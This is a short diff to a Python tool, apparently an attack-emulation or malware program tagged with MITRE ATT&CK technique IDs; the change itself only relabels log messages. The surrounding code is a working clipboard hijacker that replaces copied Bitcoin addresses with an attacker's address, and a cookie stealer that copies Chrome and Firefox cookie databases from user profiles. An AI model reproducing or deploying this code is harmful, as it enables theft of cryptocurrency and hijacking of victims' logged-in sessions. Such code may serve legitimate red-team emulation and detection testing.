@@ -34,7 +34,7 @@ def clipboard_data_alternation(platform):
             # test with 15f12gEh2DFcHyhSyu7v3Bji5T3CJa9Smn 14qViLJfdGaP4EeHnDyJbEGQysnCpwk3gd
             if bool(re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", str(pc.paste())))  == True:
                 pc.copy(BTC_address)
-                print("T1115  Clipboard Data: Success")
+                print("Info: T1115 Clipboard Data: Success")
 
 
 
@@ -105,7 +105,7 @@ def steel_cookie_db(platform, username):
             try:
                 src_file = f"/Users/{username}/Library/Application Support/Google/Chrome/{default_string}/Cookies"
                 shutil.copy2(src_file, CACHE_PATH)
-                print(f"Collection of file done: {src_file}")
+                print(f"Info: Collection of file done: {src_file}")
             except:
                 pass
 
@@ -115,7 +115,7 @@ def steel_cookie_db(platform, username):
             try:
                 src_file = os.path.join(default_path, "cookies.sqlite")
                 shutil.copy2(src_file, CACHE_PATH)
-                print(f"Collection of file done: {src_file}")
+                print(f"Info: Collection of file done: {src_file}")
             except:
                 pass
 
